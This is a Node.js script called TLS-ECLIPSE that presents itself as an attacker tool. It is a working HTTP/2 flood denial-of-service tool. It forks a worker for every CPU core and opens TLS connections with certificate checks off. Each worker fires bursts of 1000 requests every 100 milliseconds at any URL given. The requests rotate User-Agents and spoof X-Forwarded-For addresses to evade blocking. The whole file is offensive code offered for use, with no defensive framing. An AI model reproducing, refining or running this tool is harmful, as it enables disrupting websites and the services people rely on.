const cluster = require('cluster');
const os = require('os');
const tls = require('tls');
const http2 = require('http2');
const url = require('url');

const target = process.argv[2];
const duration = parseInt(process.argv[3]) * 1000;
if (!target || isNaN(duration)) {
    console.log("Usage: node TLS-ECLIPSE.js <url> <duration_in_seconds>");
    process.exit(1);
}

const parsed = url.parse(target);
const host = parsed.hostname;
const port = 443;
const path = parsed.path || '/';

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (X11; Linux x86_64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
];

function randIP() {
    return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
}

function launchH2(socket) {
    const client = http2.connect(parsed.href, {
        createConnection: () => socket
    });

    client.on('error', () => {});

    for (let i = 0; i < 1000; i++) {
        const headers = {
            ':method': 'GET',
            ':path': path,
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'X-Forwarded-For': randIP(),
            'Accept': '*/*',
        };

        const req = client.request(headers);
        req.on('response', () => {});
        req.end();
    }
}

function buildSocket() {
    return tls.connect({
        host,
        port,
        servername: host,
        rejectUnauthorized: false,
        ALPNProtocols: ['h2', 'http/1.1'],
    });
}

let loopCount = 0;

function attackLoop() {
    const socket = buildSocket();
    socket.on('secureConnect', () => {
        launchH2(socket);
        setInterval(() => {
            if (!socket.destroyed) {
                launchH2(socket);
                loopCount++;
            }
        }, 100);
    });

    socket.on('error', () => {});
}

function megaAttack() {
    const endTime = Date.now() + duration;

    console.log(`[+] Attack Started @ ${new Date().toLocaleTimeString()}`);
    console.log(`[+] Target: ${target}`);
    console.log(`[+] Duration: ${duration / 1000}s`);
    console.log(`[+] Worker PID: ${process.pid}`);

    const interval = setInterval(() => {
        process.stdout.write(`\r[>] Running... Loops: ${loopCount} | Est. Req Sent: ${loopCount * 1000}`);
    }, 500);

    function loop() {
        if (Date.now() >= endTime) {
            clearInterval(interval);
            console.log(`\n\n[!] Attack Finished @ ${new Date().toLocaleTimeString()}`);
            console.log(`[+] Total Loops: ${loopCount}`);
            console.log(`[+] Estimated Requests Sent: ${loopCount * 1000}`);
            process.exit(0);
        }
        attackLoop();
        setImmediate(loop);
    }

    loop();
}

if (cluster.isMaster) {
    const threads = os.cpus().length;
    console.clear();
    console.log("======================================");
    console.log("         TLS-ECLIPSE ATTACKER         ");
    console.log("======================================");
    console.log(`[+] Target     : ${target}`);
    console.log(`[+] Duration   : ${duration / 1000}s`);
    console.log(`[+] Cores Used : ${threads}`);
    console.log("======================================\n");

    for (let i = 0; i < threads; i++) cluster.fork();
} else {
    megaAttack();
}
